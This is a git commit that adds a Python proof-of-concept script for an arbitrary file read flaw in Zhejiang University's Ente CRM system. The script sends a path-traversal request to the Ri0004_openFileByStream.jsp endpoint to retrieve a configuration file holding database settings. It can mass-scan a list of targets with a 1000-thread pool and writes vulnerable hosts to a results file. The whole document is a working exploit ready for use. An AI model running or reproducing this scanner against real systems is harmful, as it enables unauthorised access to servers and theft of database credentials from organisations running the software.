d0c7faf0c7730245550d93136637e16810c58b28
lbyssssss <594479093@qq.com>
2024-04-13 13:09:40 +0800

    Create poc.py

---
+++ 浙大恩特客户资源管理系统Ri0004_openFileByStream.jsp接口存在任意文件读取漏洞/poc.py
@@ -0,0 +1,66 @@
+import requests,argparse,sys
+from multiprocessing.dummy import Pool
+import json
+requests.packages.urllib3.disable_warnings()
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description="浙大恩特客户资源管理系统Ri0004_openFileByStream.jsp接口存在任意文件读取漏洞")
+    parser.add_argument('-u','--url',help="please input your url")
+    parser.add_argument('-f','--file',help="please input your file")
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        with open(args.file,'r',encoding='utf-8') as fp:
+            fo = fp.readlines()
+            url_list = []
+            for i in fo:
+                url_list.append(i.strip().replace('\n',''))
+        mp = Pool(1000)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+
+def banner():
+    banner = '''
+     __                            __                      __  __ 
+    |  \                          |  \                    |  \|  \
+    | $$____    ______    _______ | $$   __  __   __   __  \$$ \$$
+    | $$    \  |      \  /       \| $$  /  \|  \ |  \ |  \|  \|  \
+    | $$$$$$$\  \$$$$$$\|  $$$$$$$| $$_/  $$| $$ | $$ | $$| $$| $$
+    | $$  | $$ /      $$| $$      | $$   $$ | $$ | $$ | $$| $$| $$
+    | $$  | $$|  $$$$$$$| $$_____ | $$$$$$\ | $$_/ $$_/ $$| $$| $$
+    | $$  | $$ \$$    $$ \$$     \| $$  \$$\ \$$   $$   $$| $$| $$
+     \$$   \$$  \$$$$$$$  \$$$$$$$ \$$   \$$  \$$$$$\$$$$  \$$ \$$
+                                                auther:lllo    
+    '''
+    print(banner)
+def poc(target):
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
+        'Accept': '*/*',
+        'Connection': 'Keep-Alive',
+
+
+
+    }
+    proxies = {
+        'http': '127.0.0.1:8080',
+        'https': '127.0.0.1:8080'
+    }
+
+    url = target+'/entsoft/module/i0004_openFileByStream.jsp;.jpg?filepath=/../EnterCRM/bin/xy.properties&filename=conan'
+
+    try:
+        res = requests.get(url=url,headers=headers,timeout=5).text
+        if "dbname" in res:
+            with open('result.txt','a') as fp1:
+                fp1.write(f"[+]{target} is veriable"+'\n')
+        else:
+            print(f'[-]{target} is not veriable')
+    except:
+        print(f'[*]{target} server erro')
+
+if __name__ =='__main__':
+    main()
